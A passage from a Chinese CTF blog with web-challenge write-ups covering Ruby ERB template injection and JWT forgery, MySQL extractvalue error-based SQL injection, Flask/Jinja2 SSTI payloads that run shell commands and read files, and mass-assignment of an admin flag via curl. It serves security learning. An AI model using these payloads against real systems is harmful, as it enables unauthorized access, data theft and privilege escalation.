<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>在上一步中，我们已经成功拿到上传的权限了，现在到linux中生成读取flag的软连接，上传之后服务端回显如下：<br><img src="http://ggb0n.cool/images/swpuctf04.png" alt=""></p>
<p>因为是一个有问题的图片，无法显示，其实就是BUU改了，它本质上还是一个txt，下载下来即可拿到flag。</p>
<h2 id="Flag-Shop"><a href="#Flag-Shop" class="headerlink" title="Flag Shop"></a>Flag Shop</h2><p>考察JWT伪造，ruby的ERB模板注入。后者是第一次接触</p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现可以买flag，但是很贵，这个时候又可以进行work拿jkl，这点到啥时候去啊…<br><img src="http://ggb0n.cool/images/swpuctf05.png" alt=""></p>
<p>不过存在robots.txt，提示了<code>filebake</code>的存在：<br><img src="http://ggb0n.cool/images/swpuctf06.png" alt=""></p>
<p>访问<code>fileback</code>拿到源码：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>代码是ruby写的，还没学…不过从代码中可以看到出现了<code>JWT</code>，应该跟JWT伪造有关，稍微审一下代码发现<code>jkl</code>指的应该就是金币数量，同uid一起写进了cookie里，抓个包拿jwt解密看看：<br><img src="http://ggb0n.cool/images/swpuctf07.png" alt=""></p>
<p>可以看到<code>jkl</code>的值为<code>28</code>，也就是现有的金币数，那应该就是要伪造<code>JWT</code>来买到flag了，但是伪造需要<code>SECRET</code>，现在我们并没有，怎么办？</p>
<p>在<code>/work</code>路由下有这么一段代码：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')</span></span><br></pre></td></tr></table></figure>

<p>这里我们可以控制，但是只有7个字符，参考题解说是<code>ERB模板注入</code>，这里可以用ruby的预定义字符<code>$</code>对匹配的字符串进行读取，从而获取<code>SECRET</code>，l利用点当然也就在<code>/work</code>路由下了，可以抓包看看：</p>
<p><img src="http://ggb0n.cool/images/swpuctf08.png" alt=""></p>
<p>根据参数构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working</span><br><span class="line">即</span><br><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img src="http://ggb0n.cool/images/swpuctf09.png" alt=""></p>
<p>拿到SECRET之后，进行JWT伪造：<br><img src="http://ggb0n.cool/images/swpuctf10.png" alt=""></p>
<p>然后<code>buy flag</code>抓包进行替换即可买到flag：<br><img src="http://ggb0n.cool/images/swpuctf11.png" alt=""></p>
<p>由响应结果可以看到，已经成功买到了flag，但是响应中并没有啊，因为在代码中可以看到，flag其实被写入到了相应的JWT中，再去解密即可拿到。<br><img src="http://ggb0n.cool/images/swpuctf12.png" alt=""></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF学习记录</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">赛题复现</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Cookie%E6%94%BB%E5%87%BB/">Cookie攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/JWT%E4%BC%AA%E9%80%A0/">JWT伪造</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">二次注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2/">无列名查询</a><span> </span><a class="article-more button is-small link-muted" href="/tags/ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">ERB模板注入</a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-03-13T14:50:13.000Z">2020-03-13</time><span class="level-item">15 minutes read (About 2228 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/">RootersCTF复现</a></h1><div class="content"><h2 id="RootersCTF-Babyweb"><a href="#RootersCTF-Babyweb" class="headerlink" title="RootersCTF-Babyweb"></a>RootersCTF-Babyweb</h2><p>My junior dev just set up a password protected webpage. Can you get in?</p>
<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>打开链接提示管理员的密码是18位，并且过滤掉了UNION SLEEP ‘ “ OR - BENCHMARK。因此利用爆破出密码是比较不现实的，结合题目提示是使用注入方法。看到单引号和双引号被过滤，猜测是被反斜杠转义掉，便尝试宽字节注入，使用<code>%df%27</code>进行测试，结果注入失败。</p>
<p>并且提示UNION、OR也都被过滤，原本想着利用大小写或者编码绕过，但是引号既然不能成功绕过，说明不能用闭合引号进行注入。经过多次尝试发现利用<code>extractvalue()</code>函数进行报错注入可以成功实现注入,因此可以结合concat函数实现注入。</p>
<p><code>extractvalue()</code>：函数功能是从目标XML中返回包含所查询值的字符串。</p>
<blockquote>
<p>EXTRACTVALUE (XML_document, XPath_string);</p>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)</p>
<p>extractvalue注入的原理：如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p>
</blockquote>
<h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><p>1、爆库名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>%<span class="number">0</span>adatabase()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
<p>回显XPATH syntax error:~SQLinjection~，爆出了库名SQLinjection<br>2、爆表名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
<p>回显XPATH syntax error:~users~，爆出了表名users<br>这里需要说名一下，由于单双引号被过滤，故注入语句中如果有字符串需要单双引号，应当尽量避免，这里可以使用查询语句的多重利用避免，当然直接填库名也是不需要单双引号的（下面表名同理）。<br>3、爆列名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
<p>回显XPATH syntax error:~user、uniqueid~，爆出列名user、uniqueid，这两个列里肯定有我们需要的重要内容。<br>4、爆字段</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> uniqueid/<span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
<p>这里分两步分别爆出admin和其对应的18位的uniqueid，拿去尝试登录，成功登路并拿到flag。<br>由于环境不能复现，做题的时候也没有截图，这里不再贴出图片。</p>
<p>报错注入参考链接：<a href="https://www.jianshu.com/p/bf5edd484957">https://www.jianshu.com/p/bf5edd484957</a></p>
<h2 id="I-lt-3-Flask"><a href="#I-lt-3-Flask" class="headerlink" title="I_&lt;3_Flask"></a>I_&lt;3_Flask</h2><p>典型的SSTI，参考国外师傅的WP学到了一些新姿势</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目：<br><img src="http://www.ggb0n.cool/images/rooters1.png" alt=""></p>
<p>断定是python flask的SSTI了，但是不知道参数是啥，在复现的时候发现国外师傅提到一个参数扫描的工具<a href="https://github.com/s0md3v/Arjun">arjun</a>，直接扫参数：<br><img src="http://www.ggb0n.cool/images/rooters2.png" alt=""></p>
<p>用<code>name</code>参数测试一下：<br><img src="http://www.ggb0n.cool/images/rooters3.png" alt=""></p>
<p>可以看到成功注入，那下面就是利用注入姿势来爆flag了。</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>一种解题的payload是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是这种方法在复现的时候没有成功，学到另外一种姿势：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;].open(&#39;flag.txt&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ggb0n.cool/images/rooters4.png" alt=""></p>
<p>参考：<br><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8</a><br><a href="https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2">https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2</a></p>
<h2 id="ImgXweb"><a href="#ImgXweb" class="headerlink" title="ImgXweb"></a>ImgXweb</h2><p>考察JWT伪造攻击。</p>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现存在注册、登录按钮，先注册一个登录看看，发现可以进行文件上传，但是奈何本题不是考文件上传拿shell的…</p>
<p>通过扫后台发现<code>robots.txt</code>的存在（可见扫后台的重要性啊）：<br><img src="http://www.ggb0n.cool/images/rooters13.png" alt=""></p>
<p>而<code>robots.txt</code>中提示了一个<code>secretkey</code>秘钥文件的存在，内容如下：<br><img src="http://www.ggb0n.cool/images/rooters5.png" alt=""></p>
<p>给这个干嘛？结果抓包发现了另一番天地：<br><img src="http://www.ggb0n.cool/images/rooters6.png" alt=""></p>
<p>可以看到cookie采用了JWT，拿去base64解密一下（还有几篇讲到JWT伪造攻击的博客，有需要的可以看看）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&#123;&quot;user&quot;:&quot;ggb0n&quot;&#125;×¿ð¬Á#È¬­ í_mn×Züt</span><br></pre></td></tr></table></figure>

<p>这肯定是考JWT伪造的了，秘钥都给了，多简单，拿去网站伪造一下：<br><img src="http://www.ggb0n.cool/images/rooters7.png" alt=""></p>
<p>然后抓包改包，发现成功伪造了admin身份，从回显页面中可以看到<code>flag.png</code>的存在，这里赵师傅没有放原图，应该是为了方便BOT生成和识别固定格式的flag吧：<br><img src="http://www.ggb0n.cool/images/rooters8.png" alt=""></p>
<p>其实，flag已经很近了，查看源码可以看到flag.png的存储路径，直接访问即可拿到flag：<br><img src="http://www.ggb0n.cool/images/rooters9.png" alt=""></p>
<p><img src="http://www.ggb0n.cool/images/rooters10.png" alt=""></p>
<p>原来png不是png，而是txt啊…赵师傅badbad。。。</p>
<h2 id="notifyxapi"><a href="#notifyxapi" class="headerlink" title="notifyxapi"></a>notifyxapi</h2><p>还是考察JWT伪造攻击。</p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，看到给出了几个利用<code>curl</code>进行注册、登录、查看通知的几个操作：<br><img src="http://www.ggb0n.cool/images/rooters11.png" alt=""></p>
<p><img src="http://www.ggb0n.cool/images/rooters12.png" alt=""></p>
<p>有点像教怎么用curl的[手动滑稽]，我们根据提供的语句去试试效果：</p>
<p>先注册个账户：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "ggb0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"created_user":&#123;"id":<span class="number">3</span>,"user":&#123;"email":"ggb0n@test.com","id":<span class="number">3</span>,"is_admin":false&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTI2NTEsIm5iZiI6MTU4NDA5MjY1MSwianRpIjoiMTIyZDQ2MTQtNzZhYS00YjJhLTlmZWEtYmY1OTE0ZTQ5OTk0IiwiZXhwIjoxNjE1NjI4NjUxLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.r8-IqT1VUwqJuYpHgKI6uqQZn6nR07RoDnDWWGgyeVc"&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>关注的点来了：<code>is_admin</code>属性为<code>false</code>，多半知道这题是干嘛的了。先不管，先登录看看：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "ggb0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"id":&#123;"email":"ggb0n@test.com","id":<span class="number">3</span>,"is_admin":false&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTMwNDcsIm5iZiI6MTU4NDA5MzA0NywianRpIjoiZjFlYmViYjItMmFmMi00OWFjLTljN2UtNjFlODM3MTVkN2I2IiwiZXhwIjoxNjE1NjI5MDQ3LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.Nj2knq7DFsNRoZhNfyAvbMp6wMPV6lWAcXM1p6xIqRo"&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到登录和注册的时候<code>JWT</code>的第三部分是不同的，也就是表示登录的状态，看通知的话，当然要先登录嘛。</p>
<p>拿登录上的JWT去看看notification什么情况：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -H "Authorization: Bearer $ACCESS" -H "Content-<span class="built_in">Type</span>: application/json" "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/"</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"hey, rosssssss","id":<span class="number">2</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"Jen Barber? Is that the internet?","id":<span class="number">3</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;]</span><br></pre></td></tr></table></figure>

<p>通过这个请求，我们可以看到别的用户发的通知，想必管理员能看到不一样的结果吧，结合前面存在的<code>is_admin</code>属性并且为<code>false</code>，思路肯定是要去想办法让<code>is_admin</code>为<code>true</code>了。</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>由于回显的都是注册时候的键值对，我们直接在注册的时候多加一个<code>&quot;id_admin&quot;:true</code>的属性键值对创建个账户试试：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "gg.b0n@test.com", "password": <span class="number">1</span>"password","is_admin":true&#125;'</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"created_user":&#123;"id":<span class="number">4</span>,"user":&#123;"email":"gg.b0n@test.com","id":<span class="number">4</span>,"is_admin":true&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM3MzQsIm5iZiI6MTU4NDA5MzczNCwianRpIjoiZjcyMTYzNWEtZTQ1Ny00NTA0LWI0MDEtNjlmMGM1NzM2OGI1IiwiZXhwIjoxNjE1NjI5NzM0LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.NC-cqxfT8wWgsyDzXMo04NLfAK9k7uim8M127DixOAw"&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可见账户成功创建了，并且此时<code>is_admin</code>属性已经为<code>true</code>了，快登陆去看看通知：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "gg.b0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"id":&#123;"email":"gg.b0n@test.com","id":<span class="number">4</span>,"is_admin":true&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM"&#125;</span><br></pre></td></tr></table></figure>

<p>用登录上的<code>JWT</code>去看通知：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">export ACCESS="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM"</span><br><span class="line"></span><br><span class="line">curl -H "Authorization: Bearer $ACCESS" -H "Content-<span class="built_in">Type</span>: application/json" "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/"</span><br></pre></td></tr></table></figure>

<p>回显如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[&#123;"issuer":&#123;"email":"admin@test.com","id":<span class="number">1</span>&#125;,"body":"rooters&#123;a_big_hard_business_in_a_big_hard_building&#125;ctf","id":<span class="number">1</span>,"<span class="built_in">title</span>":"flag"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"hey, rosssssss","id":<span class="number">2</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"Jen Barber? Is that the internet?","id":<span class="number">3</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"admin@test.com","id":<span class="number">1</span>&#125;,"body":"flag&#123;<span class="number">1</span>b411b83-d725-<span class="number">4</span>e8f-a50a-<span class="number">3</span>bd14a35de6a&#125;","id":<span class="number">1</span>,"<span class="built_in">title</span>":"flag"&#125;]</span><br></pre></td></tr></table></figure>

<p>成功拿到flag。<br>这题算是考察JWT伪造比较简单的了吧。</p>
